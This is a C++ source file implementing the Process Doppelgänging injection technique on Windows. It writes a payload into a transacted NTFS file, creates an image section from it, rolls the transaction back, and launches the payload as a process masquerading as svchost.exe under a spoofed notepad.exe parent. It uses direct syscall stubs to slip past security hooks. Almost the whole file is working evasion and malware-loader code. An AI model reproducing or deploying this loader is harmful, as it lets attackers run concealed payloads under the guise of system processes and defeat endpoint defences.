#include <Windows.h>
#include <KtmW32.h>
#include <userenv.h>
#include <iostream>
#include <stdio.h>
#include <tlhelp32.h>

#include "syscalls.h"
#include "base64.h"

#pragma comment(lib, "KtmW32.lib")
#pragma comment(lib, "Ntdll.lib")
#pragma comment(lib, "Userenv.lib")

#define PAGE_SIZE 0x1000

HANDLE GetPpidByName(const std::wstring& processName)
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (!processName.compare(entry.szExeFile))
            {
                CloseHandle(snapshot);
                std::cout << "[+] Parent PID = " << entry.th32ProcessID << "\n";
                return (HANDLE)entry.th32ProcessID;
            }
        }
    }
}

BYTE* GetNtHeaders(const BYTE* pe_buffer)
{
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh->e_lfanew;

    if (pe_offset > kMaxOffset) return NULL;

    IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)(pe_buffer + pe_offset);
    if (inh->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }
    return (BYTE*)inh;
}

WORD GetPEArchitecture(const BYTE* pe_buffer)
{
    void* ptr = GetNtHeaders(pe_buffer);
    if (ptr == NULL) return 0;

    IMAGE_NT_HEADERS32* inh = static_cast<IMAGE_NT_HEADERS32*>(ptr);
    return inh->FileHeader.Machine;
}

DWORD GetEntryPointRVA(const BYTE* pe_buffer)
{
    WORD arch = GetPEArchitecture(pe_buffer);
    BYTE* payload_nt_hdr = GetNtHeaders(pe_buffer);
    if (payload_nt_hdr == NULL) {
        return 0;
    }
    DWORD ep_addr = 0;
    if (arch == IMAGE_FILE_MACHINE_AMD64) {
        IMAGE_NT_HEADERS64* payload_nt_hdr64 = (IMAGE_NT_HEADERS64*)payload_nt_hdr;
        ep_addr = payload_nt_hdr64->OptionalHeader.AddressOfEntryPoint;
    }
    else {
        IMAGE_NT_HEADERS32* payload_nt_hdr32 = (IMAGE_NT_HEADERS32*)payload_nt_hdr;
        ep_addr = static_cast<ULONGLONG>(payload_nt_hdr32->OptionalHeader.AddressOfEntryPoint);
    }
    return ep_addr;
}

void FreeBuffer(BYTE* buffer, size_t buffer_size)
{
    if (buffer == NULL) return;
    VirtualFree(buffer, buffer_size, MEM_DECOMMIT);
}

wchar_t* GetFileName(wchar_t* full_path)
{
    size_t len = wcslen(full_path);
    for (size_t i = len - 2; i >= 0; i--) {
        if (full_path[i] == '\\' || full_path[i] == '/') {
            return full_path + (i + 1);
        }
    }
    return full_path;
}

wchar_t* GetDirectoryName(IN wchar_t* full_path, OUT wchar_t* out_buf, IN const size_t out_buf_size)
{
    memset(out_buf, 0, out_buf_size);
    memcpy(out_buf, full_path, out_buf_size);

    wchar_t* name_ptr = GetFileName(out_buf);
    if (name_ptr != nullptr) {
        *name_ptr = '\0'; //cut it
    }
    return out_buf;
}

bool SetParametersInPEB(PVOID params_base, HANDLE hProcess, PROCESS_BASIC_INFORMATION& pbi)
{
    ULONGLONG remote_peb_addr = (ULONGLONG)pbi.PebBaseAddress;
    if (!remote_peb_addr) {
        std::cerr << "Failed getting remote PEB address!" << std::endl;
        return false;
    }
    PEB peb_copy = { 0 };
    ULONGLONG offset = (ULONGLONG)&peb_copy.ProcessParameters - (ULONGLONG)&peb_copy;

    LPVOID remote_img_base = (LPVOID)(remote_peb_addr + offset);

    SIZE_T written = 0;
    NTSTATUS status = SysNtWriteVirtualMemory10(hProcess, remote_img_base, &params_base, sizeof(PVOID), nullptr);
    return true;
}

bool BufferRemotePEB(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, OUT PEB& peb_copy)
{
    memset(&peb_copy, 0, sizeof(PEB));
    PPEB remote_peb_addr = pi.PebBaseAddress;
    
    NTSTATUS status = SysNtReadVirtualMemory10(hProcess, remote_peb_addr, &peb_copy, sizeof(PEB), NULL);
    if (status != STATUS_SUCCESS)
    {
        std::cerr << "Cannot read remote PEB: " << GetLastError() << std::endl;
        return false;
    }
    return true;
}

LPVOID WriteParametersInProcess(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERS params, DWORD protect)
{
    if (params == NULL) return NULL;

    PVOID buffer = params;
    ULONG_PTR buffer_end = (ULONG_PTR)params + params->Length;

    if (params->Environment) {
        if ((ULONG_PTR)params > (ULONG_PTR)params->Environment) {
            buffer = (PVOID)params->Environment;
        }
        ULONG_PTR env_end = (ULONG_PTR)params->Environment + params->EnvironmentSize;
        if (env_end > buffer_end) {
            buffer_end = env_end;
        }
    }

    SIZE_T buffer_size = buffer_end - (ULONG_PTR)buffer;
    NTSTATUS status = SysNtAllocateVirtualMemory10(hProcess, &buffer, NULL, &buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status == 0) {
        NTSTATUS param = SysNtWriteVirtualMemory10(hProcess, (PVOID)params, (PVOID)params, params->Length, NULL);
        NTSTATUS envi = SysNtWriteVirtualMemory10(hProcess, (PVOID)params->Environment, (PVOID)params->Environment, params->EnvironmentSize, NULL);
        return (LPVOID)params;
    }
    return nullptr;
}

bool InitProcessParameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, LPWSTR targetPath)
{
    UNICODE_STRING uTargetPath = { 0 };
    RtlInitUnicodeString(&uTargetPath, targetPath);
    wchar_t dirPath[MAX_PATH] = { 0 };
    GetDirectoryName(targetPath, dirPath, MAX_PATH);
    UNICODE_STRING uCurrentDir = { 0 };
    RtlInitUnicodeString(&uCurrentDir, dirPath);
    wchar_t dllDir[] = L"C:\\Windows\\System32";
    UNICODE_STRING uDllDir = { 0 };
    RtlInitUnicodeString(&uDllDir, dllDir);
    UNICODE_STRING uWindowName = { 0 };
    RtlInitUnicodeString(&uWindowName, targetPath);

    LPVOID environment;
    CreateEnvironmentBlock(&environment, NULL, TRUE);

    PRTL_USER_PROCESS_PARAMETERS params = nullptr;

    RtlCreateProcessParametersEx pfnRtlCreateProcessParametersEx = (RtlCreateProcessParametersEx)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlCreateProcessParametersEx");

    NTSTATUS status = pfnRtlCreateProcessParametersEx(
        &params,
        (PUNICODE_STRING)&uTargetPath,
        (PUNICODE_STRING)&uDllDir,
        (PUNICODE_STRING)&uCurrentDir,
        (PUNICODE_STRING)&uTargetPath,
        environment,
        (PUNICODE_STRING)&uWindowName,
        nullptr,
        nullptr,
        nullptr,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "RtlCreateProcessParametersEx failed" << std::endl;
        return false;
    }
    LPVOID remote_params = WriteParametersInProcess(hProcess, params, PAGE_READWRITE);
    if (!remote_params) {
        std::cout << "[+] Cannot make a remote copy of parameters: " << GetLastError() << std::endl;
        return false;
    }
    
    PEB peb_copy = { 0 };
    if (!BufferRemotePEB(hProcess, pi, peb_copy)) {
        return false;
    }

    if (!SetParametersInPEB(remote_params, hProcess, pi)) {
        std::cout << "[+] Cannot update PEB: " << GetLastError() << std::endl;
        return false;
    }
    
    return true;
}

bool ProcessDoppel(wchar_t* targetPath, const wchar_t* parentProcess, BYTE* payladBuf, DWORD payloadSize)
{
    DWORD options, isolationLvl, isolationFlags, timeout;
    options = isolationLvl = isolationFlags = timeout = 0;

    HANDLE hTransaction = nullptr;
    NTSTATUS status = SysNtCreateTransaction10(&hTransaction, MAXIMUM_ALLOWED, nullptr, nullptr, nullptr, options, isolationLvl, isolationFlags, nullptr, nullptr);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create transaction!" << std::endl;
        return false;
    }

    HMODULE lib = LoadLibraryA("ntdll.dll");
    RTLSETCURRENTTRANSACTION pfnRtlSetCurrentTransaction = (RTLSETCURRENTTRANSACTION)GetProcAddress(lib, "RtlSetCurrentTransaction");
    
    BOOL transaction = pfnRtlSetCurrentTransaction(hTransaction);

    HANDLE hTransactedFile = nullptr;
    OBJECT_ATTRIBUTES fileAttributes;
    IO_STATUS_BLOCK block;
    UNICODE_STRING fileName;
    
    ZeroMemory(&block, sizeof(IO_STATUS_BLOCK));
    RtlInitUnicodeString(&fileName, (PCWSTR)L"\\??\\c:\\Users\\Public\\nonexistant.txt");
    InitializeObjectAttributes(&fileAttributes, &fileName, 0x00000040, NULL, NULL);
    status = SysNtCreateFile10(&hTransactedFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE, &fileAttributes, &block, nullptr, FILE_ATTRIBUTE_NORMAL, 0, 0x00000003, 0x00000020, NULL, 0);
    
    transaction = pfnRtlSetCurrentTransaction(nullptr);

    ZeroMemory(&block, sizeof(IO_STATUS_BLOCK));
    status = SysNtWriteFile10(hTransactedFile, nullptr, nullptr, nullptr, &block, payladBuf, payloadSize, nullptr, nullptr);

    HANDLE hSection = nullptr;
    status = SysNtCreateSection10(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);

    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
        return false;
    }
    CloseHandle(hTransactedFile);
    hTransactedFile = nullptr;

    if (RollbackTransaction(hTransaction) == FALSE) {
        std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
        return false;
    }
    CloseHandle(hTransaction);
    hTransaction = nullptr;

    HANDLE hParent = nullptr;

    OBJECT_ATTRIBUTES objectAttributes;
    InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);


    CLIENT_ID clientId = { 0 };
    clientId.UniqueProcess = GetPpidByName(parentProcess);
    clientId.UniqueThread = (HANDLE)0;

    status = SysNtOpenProcess10(&hParent, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);

    HANDLE hProcess = nullptr;
    status = SysNtCreateProcessEx10(&hProcess, PROCESS_ALL_ACCESS, NULL, hParent, PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);

    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateProcessEx failed! Status: " << std::hex << status << std::endl;
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            std::cerr << "[!] The payload has mismatching bitness!" << std::endl;
        }
        return false;
    }

    PROCESS_BASIC_INFORMATION pi = { 0 };

    DWORD ReturnLength = 0;
    status = SysNtQueryInformationProcess10(hProcess, ProcessBasicInformation, &pi, sizeof(PROCESS_BASIC_INFORMATION), &ReturnLength);

    if (status != STATUS_SUCCESS) {
        std::cerr << "NtQueryInformationProcess failed" << std::endl;
        return false;
    }
    PEB peb_copy = { 0 };
    if (!BufferRemotePEB(hProcess, pi, peb_copy)) {
        return false;
    }
    ULONGLONG imageBase = (ULONGLONG)peb_copy.ImageBaseAddress;
    
    DWORD payload_ep = GetEntryPointRVA(payladBuf);
    ULONGLONG procEntry = payload_ep + imageBase;

    if (!InitProcessParameters(hProcess, pi, targetPath)) {
        std::cerr << "Parameters setup failed" << std::endl;
        return false;
    }
    std::cout << "[+] Process created! PID = " << GetProcessId(hProcess) << "\n";
    
    HANDLE hThread = NULL;

    status = SysNtCreateThreadEx10(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)procEntry, NULL, FALSE, 0, 0, 0, NULL);

    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateThreadEx failed: " << GetLastError() << std::endl;
        return false;
    }

    return true;
}

int ProcessDoppleganging(BYTE* memBuffer, size_t payloadSize)
{
    wchar_t defaultTarget[] = L"C:\\WINDOWS\\System32\\svchost.exe";
    wchar_t* targetPath = defaultTarget;

    wchar_t parentProcess_[] = L"notepad.exe";
    wchar_t* parentProcess = parentProcess_;

    bool is_ok = ProcessDoppel(targetPath, parentProcess ,memBuffer, (DWORD)payloadSize + 626);

    FreeBuffer(memBuffer, payloadSize);
    if (is_ok) {
        std::cerr << "[+] Done!" << std::endl;
    }
    else {
        std::cerr << "[-] Failed!" << std::endl;
        return -1;
    }
    return 0;
}
